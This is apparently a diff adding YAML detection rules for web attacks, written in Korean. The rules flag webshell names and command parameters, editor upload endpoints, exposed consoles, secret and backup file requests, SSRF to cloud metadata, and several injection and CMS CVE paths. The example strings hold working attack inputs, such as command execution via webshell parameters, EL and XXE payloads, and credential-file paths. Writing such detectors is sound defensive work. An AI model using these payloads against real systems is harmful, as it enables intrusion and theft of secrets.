+        regex: '/(?:c99|c100|r57|r58|b374k|wso|wso2|alfa|alfav4|indoxploit|mini|marijuana|priv8|0byte|p0wny|weevely|locus7|sadrazam|idx|anonghost|gel4y|sym404|bypass403|leaf|tinyfilemanager|adminer-shell|jspspy|jshell|cmdjsp|browser|caidao|chopper|godzilla|behinder|rebeyond|ice-?scorpion|shell_?exec|webshell|web_?shell|backdoor|cmdshell|cmd_?shell)\d{0,3}\.(?:php\d?|phtml|jspx?|aspx?|ashx|cfm|cgi|pl)$'
+        examples: ['/uploads/c99.php', '/images/wso.php', '/app/webshell.jsp', '/upload/cmdshell.aspx']
+        benign: ['/static/js/wso-client.js', '/browser/index.html']
+      - id: generic_names
+        title: 흔한 웹셸 파일 이름 (shell·cmd·up·x 등 짧은 이름의 실행 파일)
+        regex: '/(?:shell|cmd|command|exec|eval|sh|bd|door|hack|hacked|pwn|pwned|own|owned|test_?shell|uploader|up|upl|x|xx|xxx|a|aa|z|zz|1|11|123|0x|k|kk)\.(?:php\d?|phtml|jspx?|aspx|ashx)$'
+        severity: 0.7
+        success: only
+        examples: ['/upload/shell.php', '/img/1.jsp', '/files/x.aspx', '/data/cmd.jspx']
+        benign: ['/index.php', '/main.jsp', '/default.aspx']
+      - id: in_upload_dir
+        title: 업로드·이미지 폴더 안의 실행 파일 요청
+        confidence: high
+        regex: '/(?:uploads?|upfiles?|uploadfiles?|attach(?:ments?|file)?|files?|images?|img|photos?|data|editor|se2|smarteditor|fckeditor|ckeditor|ckfinder|kcfinder|namo|daumeditor|cheditor|board/files?|bbs/data|pds|tmp|temp)/(?:[^/?]{1,80}/){0,4}[^/?]{1,80}\.(?:php\d?|phtml|pht|jspx?|jspf|aspx?|ashx|asmx|cer|asa|cfm|war)$'
+        severity: 0.8
+        success: only
+        examples: ['/upload/2026/10/photo.jsp', '/data/editor/a1b2.php', '/bbs/data/free/x.asp']
+        benign: ['/upload/2026/10/photo.jpg', '/files/report.pdf', '/images/logo.png']
+      - id: double_extension
+        title: 확장자를 속인 실행 파일 (이중 확장자·널 문자·세미콜론)
+        confidence: high
+        regex: '\.(?:php\d?|phtml|jspx?|aspx?|ashx|cer|asa)(?:\.|;|%00|\x00|::\$data)\.?(?:jpe?g|png|gif|bmp|txt|pdf|docx?|xlsx?|hwp|zip)?$|\.(?:jpe?g|png|gif|bmp|txt|pdf)\.(?:php\d?|phtml|jspx?|aspx?|ashx)$|\.(?:php|jsp|asp)\s*\.$|\.(?:ph(?:p\d?|tml|t|ar)|jspx?|aspx?)/'
+        examples: ['/upload/a.php.jpg', '/upload/a.jpg.php', '/upload/a.asp;.jpg', '/upload/a.jsp%00.png', '/up/a.php/']
+        benign: ['/upload/a.jpg', '/a/b.pdf', '/index.php']
+        raw_also: true
+      - id: tunnel
+        title: 터널링 웹셸 (reGeorg·Neo-reGeorg·ABPTTS·Tunna)
+        confidence: high
+        regex: '/(?:tunnel|tunna|regeorg|neoregeorg|neo-?regeorg|reduh|abptts|conn|socks|proxy)\d{0,2}\.(?:php|jspx?|aspx|ashx)$'
+        attack: [T1572, T1505.003]
+        examples: ['/img/tunnel.jsp', '/a/neoreg.php', '/x/reGeorg.aspx']
+        benign: ['/proxy/index.html']
+        match: ['/neoreg.']
+      - id: shell_params
+        title: 웹셸 조종에 쓰이는 값 이름 (cmd·exec·eval·pass 등과 실행 파일 경로)
+        severity: 0.9
+        confidence: high
+        where: uri
+        regex: '\.(?:php\d?|phtml|jspx?|aspx|ashx)\?(?:.{0,200}&)?(?:cmd|command|exec|execute|eval|shell|sh|c|x|z0|ant|pass|pwd|code|payload|run|system|passthru|assert)=(?:[^&]{0,400})(?:whoami|/bin/|cmd\.exe|/c\s|echo\s|base64|system\(|eval\(|assert\(|@ini_set|response\.write|getruntime|processbuilder|%\{|\$\{|ls\s|dir\s|cat\s|type\s|net\suser|wget\s|curl\s|chmod\s)'
+        examples: ['/up/a.php?cmd=cat+/etc/passwd', '/x.jsp?c=cmd.exe /c dir', '/s.php?pass=eval(base64_decode(x))', '/a.jsp?cmd=whoami']
+        benign: ['/board.php?cmd=list&page=2', '/view.jsp?c=notice&x=1', '/list.php?cmd=grid&x=1']
+      - id: upload_executable
+        title: 실행 파일 올리기 (올린 파일 이름이 서버에서 실행되는 형식)
+        confidence: high
+        where: upload
+        regex: '\.(?:php\d?|phtml|pht|phar|jspx?|jspf|aspx?|ashx|asmx|cer|asa|cfm|war|htaccess)(?:\.|;|%00|\x00|\s|$)'
+        severity: 0.85
+        examples: [{upload: 'photo.jsp'}, {upload: 'a.php.jpg'}, {upload: 'x.asp;.jpg'}, {upload: '.htaccess'}]
+        benign: [{upload: 'photo.jpg'}, {upload: '보고서.hwp'}, {upload: 'data.xlsx'}]
+
+  # ------------------------------------------------------------------ 게시판·편집기 파일 올리기 (국내 환경에서 흔한 침투 경로)
+  - id: editor
+    title: 웹 편집기·게시판 파일 올리기 기능 접근
+    stage: EXPLOITATION
+    severity: 0.6
+    confidence: medium
+    attack: [T1190, T1505.003]
+    where: path
+    explain: 웹 편집기나 게시판에 딸린 파일 올리기 기능에 직접 접근했습니다. 이 기능들은 인증 없이 열려 있거나 확장자 검사가 약한 경우가 많아, 웹셸을 올리는 경로로 자주 쓰입니다.
+    checks:
+      - 해당 편집기·기능이 서비스에 실제로 쓰이는지, 쓰지 않으면 삭제·차단
+      - 같은 출발지가 그 뒤 업로드 폴더의 실행 파일(.jsp·.php·.asp)을 요청했는지 확인
+      - 업로드 폴더에 최근 생긴 실행 파일이 있는지 서버에서 확인
+    rules:
+      - {id: smarteditor, title: SmartEditor 파일 올리기, regex: '/(?:smarteditor2?|se2|smart_editor2?)/.{0,80}(?:file_uploader(?:_html5)?|photo_uploader|imageupload)', examples: ['/se2/sample/photo_uploader/file_uploader_html5.php', '/smarteditor/photo_uploader/popup/file_uploader.jsp']}
+      - {id: fckeditor, title: FCKeditor 파일 관리자·올리기, regex: '/fckeditor/editor/filemanager/(?:connectors|upload|browser)', examples: ['/fckeditor/editor/filemanager/connectors/jsp/connector?Command=FileUpload&Type=File&CurrentFolder=/', '/FCKeditor/editor/filemanager/upload/php/upload.php']}
+      - {id: ckfinder, title: CKFinder 연결자, regex: '/ckfinder/core/connector/|/ckfinder/userfiles', examples: ['/ckfinder/core/connector/java/connector.java?command=FileUpload&type=Files']}
+      - {id: ckeditor_upload, title: CKEditor 파일 올리기·브라우저, regex: '/ckeditor/(?:filemanager|upload|plugins/(?:filebrowser|imageuploader|uploadimage))', examples: ['/ckeditor/filemanager/connectors/php/upload.php']}
+      - {id: kcfinder, title: KCFinder 올리기, match: ['/kcfinder/upload.php', '/kcfinder/browse.php'], examples: ['/kcfinder/upload.php?type=files']}
+      - {id: kindeditor, title: KindEditor 올리기, regex: '/kindeditor/.{0,40}(?:upload_json|file_manager_json)', examples: ['/kindeditor/jsp/upload_json.jsp?dir=file']}
+      - {id: ueditor, title: UEditor 원격 이미지 받기·올리기, where: uri, regex: '/ueditor/.{0,60}controller\.(?:ashx|jsp|php).{0,20}action=(?:catchimage|uploadfile|uploadimage)', examples: ['/ueditor/net/controller.ashx?action=catchimage']}
+      - {id: ewebeditor, title: eWebEditor 관리 화면·올리기, regex: '/ewebeditor/(?:admin|upload\.|asp/upload|php/upload|jsp/upload)', examples: ['/ewebeditor/admin/login.asp']}
+      - {id: crosseditor, title: 나모 CrossEditor 올리기, regex: '/(?:crosseditor|namo)/.{0,60}(?:upload|imageupload|fileupload)', examples: ['/crosseditor/websource/jsp/ImageUpload.jsp']}
+      - {id: daumeditor, title: 다음 에디터 올리기, regex: '/daumeditor/.{0,60}(?:upload|pages/trex)', examples: ['/daumeditor/pages/trex/image.jsp']}
+      - {id: cheditor, title: CHEditor 올리기, regex: '/cheditor\d?/.{0,40}(?:upload|imageupload)', examples: ['/cheditor5/imageUpload/upload.php']}
+      - {id: webnote, title: 게시판·자료실 직접 올리기 스크립트 (upload.php·fileupload.jsp 등), regex: '/(?:file_?upload|upload_?file|uploadify|uploader|fileuploader|multiupload|plupload|jquery-file-upload)(?:\.(?:php|jsp|asp|aspx|do|action)|/(?:server/)?php/)', severity: 0.45, examples: ['/common/fileUpload.jsp', '/assets/jquery-file-upload/server/php/', '/plugins/uploadify/uploadify.php']}
+      - {id: gnuboard_admin, title: 그누보드·영카트 관리·설치 경로, regex: '/(?:adm/index\.php|install/install_db\.php|bbs/(?:register_form|write_update|qawrite_update)\.php)$', severity: 0.35, examples: ['/install/install_db.php', '/adm/index.php']}
+
+  # ------------------------------------------------------------------ 관리 화면·콘솔
+  - id: console
+    title: 관리 화면·운영 콘솔 접근
+    stage: DISCOVERY
+    severity: 0.55
+    confidence: medium
+    attack: [T1595.003, T1133]
+    where: path
+    explain: 서버·미들웨어·DB의 관리 화면에 접근했습니다. 인터넷에서 보이면 안 되는 화면이며, 성공 응답이 있으면 화면이 실제로 열려 있다는 뜻입니다.
+    checks:
+      - 성공 응답(2xx)이 있으면 그 관리 화면이 외부에 열려 있는 것이므로 접근 통제(내부망 한정) 적용
+      - 기본 계정·약한 비밀번호가 남아 있지 않은지 확인
+      - 접근 직후 로그인 시도나 설정 변경 요청이 이어졌는지 확인
+    rules:
+      - {id: tomcat_manager, title: Tomcat 관리 화면, regex: '^/(?:manager|host-manager)/(?:html|text|status|jmxproxy)', examples: ['/manager/html', '/host-manager/html']}
+      - {id: jboss_console, title: JBoss·WildFly 관리 콘솔, regex: '^/(?:jmx-console|web-console|admin-console|management|console/app\.html)', examples: ['/jmx-console/HtmlAdaptor']}
+      - {id: weblogic_console, title: WebLogic 관리 콘솔, regex: '^/console/login/loginform\.jsp|^/console/?$|^/console/console\.portal', examples: ['/console/login/LoginForm.jsp']}
+      - {id: websphere_console, title: WebSphere 관리 콘솔, regex: '^/ibm/console', examples: ['/ibm/console/logon.jsp']}
+      - {id: jeus_console, title: JEUS 관리 화면 (webadmin), regex: '^/webadmin/', examples: ['/webadmin/login.jsp']}
+      - {id: phpmyadmin, title: phpMyAdmin, regex: '/(?:phpmyadmin|pma|myadmin|mysqladmin|dbadmin|sqladmin|phpmyadmin\d|php-my-admin)(?:/|$)', examples: ['/phpmyadmin/index.php', '/pma/']}
+      - {id: phpmyadmin_setup, title: phpMyAdmin 설치 스크립트, regex: '/scripts/setup\.php$|/setup/index\.php$', severity: 0.7, examples: ['/phpmyadmin/scripts/setup.php']}
+      - {id: adminer, title: Adminer (DB 관리 도구), regex: '/adminer(?:-[\d.]+)?(?:-mysql|-en)?\.php$|/adminer/?$', examples: ['/adminer.php', '/adminer-4.8.1.php']}
+      - {id: jenkins_script, title: Jenkins 스크립트 콘솔, regex: '^/(?:jenkins/)?(?:script|scripttext|manage|systeminfo)$|/jenkins/login', examples: ['/script', '/jenkins/script']}
+      - {id: elasticsearch_api, title: Elasticsearch·OpenSearch 내부 API, regex: '^/(?:_cat/(?:indices|nodes)|_nodes|_cluster/(?:health|settings|state)|_all/_search|_search\?|_snapshot|_plugin/head)', examples: ['/_cat/indices?v', '/_nodes']}
+      - {id: solr_admin, title: Solr 관리 화면, regex: '^/solr/(?:admin/|#/)', examples: ['/solr/admin/cores?action=STATUS']}
+      - {id: kibana_grafana, title: Kibana·Grafana 화면, regex: '^/(?:app/kibana|kibana/|grafana/login|api/dashboards|api/snapshots)', severity: 0.4, examples: ['/app/kibana']}
+      - {id: docker_k8s, title: Docker·Kubernetes API, regex: '^/(?:v1\.\d{2}/)?(?:containers/json|images/json)|^/api/v1/(?:pods|namespaces|secrets)|^/apis/apps/v1|^/version$|^/(?:run|exec|pods)/', severity: 0.7, examples: ['/v1.41/containers/json', '/api/v1/namespaces/default/pods']}
+      - {id: router_admin, title: 공유기·임베디드 장비 관리 경로, regex: '^/(?:hnap1|boaform/|cgi-bin/luci|setup\.cgi|gponform/|goform/|cgi-bin/(?:config|webproc|kerbynet|nobody|supportinstaller)|shell\?|ui/login\.htm|currentsetting\.htm)', examples: ['/HNAP1/', '/boaform/admin/formLogin', '/GponForm/diag_Form?images/']}
+      - {id: wp_admin, title: 워드프레스 관리·로그인, regex: '/wp-login\.php$|/wp-admin/(?:$|admin-ajax\.php|install\.php|setup-config\.php)|/xmlrpc\.php$', severity: 0.35, examples: ['/wp-login.php', '/xmlrpc.php']}
+      - {id: joomla_admin, title: Joomla 관리 화면, regex: '^/administrator/(?:$|index\.php)', severity: 0.35, examples: ['/administrator/index.php']}
+      - {id: monitoring, title: 모니터링 화면 (Nagios·Zabbix·Cacti 등), regex: '^/(?:nagios|zabbix|cacti|munin|netdata|prometheus|pgadmin\d?)(?:/|$)', severity: 0.4, examples: ['/zabbix/index.php']}
+      - {id: webmin, title: Webmin·cPanel·Plesk, regex: '^/(?:webmin|cpanel|whm|plesk|ispconfig|directadmin|vesta)(?:/|$)|:10000/|/session_login\.cgi', severity: 0.45, examples: ['/webmin/', '/session_login.cgi']}
+
+  # ------------------------------------------------------------------ 정보 노출: 디버그·내부 정보·백업
+  - id: exposure
+    title: 내부 정보가 드러나는 경로 접근 (디버그·설정·저장소·백업)
+    stage: RECON
+    severity: 0.55
+    confidence: medium
+    attack: [T1595.003, T1552.001]
+    where: path
+    explain: 설정 파일, 디버그 화면, 소스 저장소, 백업 파일처럼 내부 정보가 들어 있는 경로를 요청했습니다. 성공 응답이 있으면 비밀번호·키·소스가 노출됐을 수 있습니다.
+    checks:
+      - 성공 응답(2xx)을 받은 경로가 있으면 실제로 내용이 내려갔는지(응답 크기) 확인
+      - 노출됐다면 그 안의 비밀번호·키를 즉시 교체하고 파일을 웹 경로에서 제거
+      - 같은 출발지가 얻은 정보로 로그인·API 호출을 시도했는지 확인
+    rules:
+      - {id: spring_actuator, title: Spring Boot Actuator (env·heapdump·mappings 등), regex: '/actuator/(?:env|heapdump|threaddump|mappings|configprops|beans|loggers|httptrace|logfile|jolokia|shutdown|restart)|^/(?:env|heapdump|trace|dump|jolokia)(?:/|$|\.json)', severity: 0.7, examples: ['/actuator/env', '/actuator/heapdump', '/jolokia/list']}
+      - {id: h2_console, title: H2 DB 콘솔, regex: '/h2-console', severity: 0.75, examples: ['/h2-console/login.jsp']}
+      - {id: swagger, title: API 문서 (Swagger·OpenAPI), regex: '/(?:swagger-ui(?:\.html|/)|swagger-resources|v[23]/api-docs|api-docs(?:\.json)?$|swagger\.(?:json|yaml)|openapi\.(?:json|yaml))', severity: 0.35, examples: ['/swagger-ui.html', '/v2/api-docs']}
+      - {id: graphql_introspection, title: GraphQL 구조 조회, where: uri, regex: '(?:query|q)=.{0,200}__schema|__type\s*\(|introspectionquery', severity: 0.4, examples: ['/graphql?query={__schema{types{name}}}']}
+      - {id: php_info, title: PHP 정보 화면, regex: '/(?:phpinfo|info|php_info|pinfo|test|i)\.php$|/\?=phpinfo', severity: 0.5, success: only, examples: ['/phpinfo.php', '/info.php']}
+      - {id: server_status, title: Apache 상태 화면, regex: '^/server-(?:status|info)(?:$|\?)|^/status\?full', success: only, examples: ['/server-status', '/server-info']}
+      - {id: debug_pages, title: 프레임워크 디버그 화면 (Laravel·Symfony·Yii·Django·.NET), regex: '/_profiler(?:/|$)|/telescope/(?:requests|api)|/debug/default/view|/_debugbar/|/elmah\.axd|/trace\.axd|/__debug__/|/debug/pprof|/storage/logs/laravel\.log|/_wdt/', severity: 0.6, examples: ['/_profiler/phpinfo', '/elmah.axd', '/storage/logs/laravel.log']}
+      - {id: source_repo, title: 소스 저장소 내부 파일 (.git·.svn·.hg), regex: '/\.git/(?:config|head|index|logs/|objects/|packed-refs|refs/)|/\.svn/(?:entries|wc\.db|all-wcprops)|/\.hg/(?:store|hgrc)|/\.bzr/', severity: 0.7, examples: ['/.git/config', '/.svn/wc.db']}
+      - {id: secrets_files, title: 비밀값이 든 파일 (.env·키·자격증명), regex: '/\.env(?:\.[a-z]+)?$|/\.aws/credentials|/\.ssh/(?:id_rsa|id_dsa|id_ed25519|authorized_keys)|/id_rsa$|/\.npmrc$|/\.dockercfg$|/\.docker/config\.json|/\.netrc$|/\.pgpass$|/\.my\.cnf$|/credentials\.(?:json|xml|yml)$|/secrets?\.(?:json|ya?ml)$|/\.htpasswd$|/\.bash_history$|/\.kube/config', severity: 0.75, examples: ['/.env', '/.aws/credentials', '/.ssh/id_rsa', '/.env.production']}
+      - {id: config_files, title: 설정 파일 직접 요청 (web.xml·web.config·wp-config·database.yml 등), regex: '/web-inf/(?:web\.xml|classes/|lib/|applicationcontext|spring)|/meta-inf/(?:context\.xml|maven/)|/web\.config$|/wp-config\.php(?:\.|~|$)|/config/database\.yml|/configuration\.php(?:\.|~|$)|/config\.(?:inc\.)?php(?:\.bak|\.old|\.save|\.swp|~)|/application\.(?:properties|ya?ml)$|/appsettings(?:\.[a-z]+)?\.json$|/settings\.py$|/localsettings\.php|/docker-compose\.ya?ml$|/dockerfile$|/\.gitlab-ci\.yml$|/jenkinsfile$', severity: 0.7, examples: ['/WEB-INF/web.xml', '/web.config', '/wp-config.php.bak', '/application.properties']}
+      - {id: ide_files, title: 개발 도구가 남긴 파일 (.idea·.vscode·.DS_Store·sftp 설정), regex: '/\.(?:idea|vscode)/|/\.ds_store$|/sftp-config\.json$|/\.ftpconfig$|/\.remote-sync\.json$|/nbproject/|/\.project$|/\.classpath$|/thumbs\.db$', severity: 0.45, examples: ['/.vscode/sftp.json', '/.DS_Store', '/sftp-config.json']}
+      - {id: backup_archive, title: 백업·덤프 파일 내려받기, regex: '/(?:[a-z0-9]+[_.-])*(?:backup|bak|dump|db|database|sql|site|www|wwwroot|web|html|public_html|data|old|archive|src|source|release)(?:[_.-][a-z0-9_.-]{0,30}|\d{0,8})\.(?:zip|rar|7z|tar|tar\.gz|tgz|gz|bz2|sql|sql\.gz|bak|dmp|mdb|sqlite3?)$|\.(?:sql|sql\.gz|dmp|mdb|bak)$', severity: 0.8, success: only, attack: [T1005, T1530], examples: ['/backup.zip', '/db_dump.sql', '/www.tar.gz', '/data/site_backup_2026.sql.gz', '/backup20261001.zip'], benign: ['/app/miapsresource.zip', '/download/appresource_v2.zip', '/files/database-guide.pdf', '/static/website.css']}
+      - {id: temp_copies, title: 편집기가 남긴 임시·복사본 소스 (.swp·~·.bak·.old·.orig), regex: '\.(?:php|jsp|jspx|asp|aspx|inc|conf|config|xml|ya?ml|properties|ini)(?:\.(?:bak|old|orig|save|swp|swo|tmp|copy|\d{6,8})|~)$', severity: 0.6, success: only, examples: ['/index.php.bak', '/config.inc.php~', '/login.jsp.old']}
+      - {id: log_files, title: 로그 파일 직접 요청, regex: '/(?:logs?|log_files?)/[a-z0-9_.-]{1,60}\.(?:log|txt)$|/(?:error|access|debug|catalina|application|app|server)[_.-]?(?:log)?\.(?:log|out)$|/nohup\.out$', severity: 0.5, success: only, examples: ['/logs/error.log', '/catalina.out', '/debug.log']}
+      - {id: cloud_metadata, title: 클라우드 내부 주소로 요청 유도 (SSRF), where: uri, regex: '169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|/latest/meta-data|/computemetadata/v1|/metadata/instance\?api-version', severity: 0.85, attack: [T1552.005], examples: ['/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/']}
+
+  # ------------------------------------------------------------------ 주입·조작 (기존 패턴 탐지가 다루지 않는 종류)
+  - id: inject
+    title: 값 조작 공격 (NoSQL·LDAP·XPath·SSI·프로토타입 오염·응답 분할)
+    stage: EXPLOITATION
+    severity: 0.75
+    confidence: medium
+    attack: [T1190]
+    where: uri
+    explain: 요청 값에 서버의 조회·처리 방식을 바꾸려는 구문이 들어 있습니다. SQL 주입·XSS·경로 조작은 다른 탐지가 다루고, 여기는 그 밖의 종류입니다.
+    checks:
+      - 성공 응답(2xx)이 있으면 응답 내용이 평소와 다른지(다른 사용자 정보, 인증 우회) 확인
+      - 대상 기능이 입력값을 검증하는지 개발 담당과 점검
+      - 같은 출발지의 값 변형 시도 횟수와 순서를 확인
+    rules:
+      - {id: nosql, title: NoSQL 주입 (MongoDB 연산자), regex: '\[\$(?:ne|gt|gte|lt|lte|in|nin|regex|where|exists|or|and)\]=|"\$(?:ne|gt|where|regex)"\s*:|\$where\s*[:=]|;\s*return\s+(?:true|1)\s*;', examples: ['/login?user[$ne]=1&pass[$ne]=1', '/api/users?filter={"age":{"$gt":""}}']}
+      - {id: ldap, title: LDAP 주입, regex: '\*\)\s*\((?:uid|cn|objectclass|mail|sn)=|\)\s*\(\|\s*\(|\(\|\(objectclass=\*\)|\)\(uid=\*\)\)', examples: ['/search?user=*)(uid=*))(|(uid=*']}
+      - {id: xpath, title: XPath 주입, regex: "'\\s*or\\s*'1'\\s*=\\s*'1'\\s*\\]|\\]\\s*\\|\\s*//|count\\(/|string-length\\(|substring\\(name\\(", examples: ["/find?name=x' or '1'='1']|//user/*[1"]}
+      - {id: ssi, title: 서버 사이드 인클루드(SSI) 주입, regex: '<!--\s*#\s*(?:exec|include|echo|printenv|config)\s', examples: ['/page?name=<!--#exec cmd="id"-->']}
+      - {id: proto_pollution, title: 프로토타입 오염 (JavaScript), regex: '__proto__(?:\[|\.|%5b)|constructor(?:\[|\.)prototype|\[constructor\]\[prototype\]', examples: ['/api?__proto__[admin]=true', '/x?constructor[prototype][isAdmin]=1']}
+      - {id: crlf, title: 응답 분할·헤더 주입 (CRLF), regex: '(?:%0d%0a|%0a|\r\n|\n)\s*(?:set-cookie|location|content-type|content-length|x-forwarded-[a-z]+)\s*:', raw_also: true, examples: ['/redirect?to=x%0d%0aSet-Cookie:%20admin=1']}
+      - {id: xxe_param, title: XML 외부 개체(XXE) 구문, regex: '<!entity\s+.{0,40}(?:system|public)\s|<!doctype\s+[a-z]+\s*\[|%\s*[a-z]+;\s*\]>', examples: ['/api?xml=<!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]>']}
+      - {id: el_injection, title: 표현식 주입 (EL·SpEL·OGNL 일반형), regex: '\$\{\s*(?:t\(java|new\s+java|pagecontext|applicationscope|runtime|\d+\s*[*+-]\s*\d+\s*\})|#\{\s*(?:t\(java|\d+\s*[*+]\s*\d+)|t\(java\.lang\.(?:runtime|processbuilder)\)', examples: ['/x?name=${T(java.lang.Runtime).getRuntime().exec("id")}', '/x?a=${7*7}']}
+      - {id: jwt_none, title: 서명 없는 JWT (alg none), regex: 'eyj[a-z0-9_-]{5,}\.eyj[a-z0-9_-]{5,}\.(?:&|$|\s)|eyjhbgcioijub25lii', raw_also: true, severity: 0.7, examples: ['/api?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.']}
+      - {id: null_byte, title: 널 문자·과대 인코딩으로 검사 우회, regex: '%00|%c0%ae|%c0%af|%c1%9c|%e0%80%af|%u002e|%uff0e|%252e%252e|\.\.;/|;jsessionid=.{0,40}\.\./', raw: true, severity: 0.6, examples: ['/download?file=../../etc/passwd%00.jpg', '/a/..;/manager/html', '/x/%c0%ae%c0%ae/']}
+      - {id: open_proxy, title: 프록시로 악용 시도 (전체 주소 요청·CONNECT), where: path, regex: '^(?:https?|ftp)://[a-z0-9.-]+', severity: 0.45, attack: [T1090], examples: ['http://example.org/', 'http://198.51.100.9:80/check.php']}
+      - {id: webdav_methods, title: 파일을 바꾸는 HTTP 메서드 (PUT·DELETE·MOVE·COPY·MKCOL), where: path, regex: '\.(?:php\d?|jspx?|aspx?|ashx|txt|html?|war)$', method: [PUT, DELETE, MOVE, COPY, MKCOL, PROPPATCH], severity: 0.75, attack: [T1505.003], examples: [{path: '/test.jsp', method: PUT}, {path: '/a.txt', method: MOVE}]}
+      - {id: trace_method, title: TRACE·TRACK·DEBUG 메서드, where: path, regex: '^/', method: [TRACE, TRACK, DEBUG], severity: 0.3, success: ignore, examples: [{path: '/', method: TRACE}]}
+
+  # ------------------------------------------------------------------ 콘텐츠 관리 도구(CMS) 취약점
+  - id: cms
+    title: 콘텐츠 관리 도구(CMS)·플러그인 취약점 공격
+    stage: EXPLOITATION
+    severity: 0.7
+    confidence: medium
+    attack: [T1190]
+    where: uri
+    explain: 워드프레스·Joomla 같은 콘텐츠 관리 도구나 그 플러그인의 알려진 취약점을 노리는 요청입니다. 해당 제품을 쓰지 않으면 무해한 탐색이지만, 쓰고 있다면 버전 확인이 필요합니다.
+    checks:
+      - 대상 서버가 해당 CMS·플러그인을 쓰는지와 버전 확인
+      - 성공 응답(2xx)이 있으면 올라간 파일·바뀐 계정이 있는지 확인
+    rules:
+      - {id: wp_file_manager, title: 워드프레스 File Manager 파일 올리기 (CVE-2020-25213), cve: CVE-2020-25213, match: ['wp-file-manager/lib/php/connector.minimal.php'], severity: 0.85, examples: ['/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php']}
+      - {id: wp_revslider, title: 워드프레스 Revolution Slider 파일 읽기·올리기, regex: 'action=revslider_(?:show_image|ajax_action)', examples: ['/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php']}
+      - {id: wp_user_enum, title: 워드프레스 계정 목록 조회, regex: '/wp-json/wp/v2/users|/\?author=\d+$|rest_route=/wp/v2/users', severity: 0.4, examples: ['/wp-json/wp/v2/users', '/?author=1']}
+      - {id: wp_uploads_php, title: 워드프레스 업로드 폴더의 실행 파일, regex: '/wp-content/uploads/.{0,120}\.(?:php\d?|phtml)(?:\?|$)', severity: 0.85, examples: ['/wp-content/uploads/2026/10/x.php']}
+      - {id: wp_plugin_probe, title: 워드프레스 플러그인·테마 버전 탐색, regex: '/wp-content/(?:plugins|themes)/[a-z0-9_-]{1,60}/(?:readme\.txt|changelog\.txt|style\.css)$', severity: 0.3, success: ignore, examples: ['/wp-content/plugins/contact-form-7/readme.txt']}
+      - {id: joomla_config, title: Joomla 설정 노출 (CVE-2023-23752), cve: CVE-2023-23752, regex: '/api/index\.php/v1/config/application\?public=true|/api/index\.php/v1/users\?public=true', severity: 0.8, examples: ['/api/index.php/v1/config/application?public=true']}
+      - {id: joomla_com, title: Joomla 구성 요소 경로 조작, regex: 'option=com_[a-z0-9_]{1,40}&.{0,100}(?:\.\./|controller=\.\.|view=\.\.|layout=\.\.)', examples: ['/index.php?option=com_foo&view=../../../../etc/passwd']}
+      - {id: drupal_misc, title: Drupal 취약 경로 (SA-CORE 계열), regex: '/user/password\?name\[%23|name\[#post_render\]|/\?q=user/password&name\[', examples: ['/?q=user/password&name[%23post_render][]=passthru&name[%23markup]=id']}
+      - {id: magento, title: Magento 취약 경로, regex: '/index\.php/admin/cms_wysiwyg/directive/|/downloader/index\.php|/rss/catalog/notifystock|/magmi/web/', severity: 0.6, examples: ['/downloader/index.php']}
+      - {id: xe_rhymix, title: XpressEngine·Rhymix 관리·취약 경로, regex: 'module=admin(?:&|$)|act=procfileupload|act=dispmemberloginform.{0,40}success_return_url=', severity: 0.45, examples: ['/index.php?module=admin', '/index.php?act=procFileUpload']}
